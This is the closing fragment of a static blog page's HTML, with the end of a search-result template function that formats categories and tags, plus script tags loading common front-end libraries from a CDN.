        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>


    <!-- JS selector for site. -->

<!-- layout specified -->


  



  <!-- image lazy-loading & popup & clipboard -->
  

  







  
    

    

  



  
    

    

  



  
    

    

  




  <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js,npm/lazysizes@5.3.2/lazysizes.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js"></script>





  

  

  







  
    

    

  



  
    

    

  



  
    

    

  



  
    

    

  




  <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1.11.6/dayjs.min.js,npm/dayjs@1.11.6/locale/en.min.js,npm/dayjs@1.11.6/plugin/relativeTime.min.js,npm/dayjs@1.11.6/plugin/localizedFormat.min.js"></script>







<script defer src="/assets/js/dist/post.min.js"></script>



<!-- commons -->

<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>




  </body>

</html>

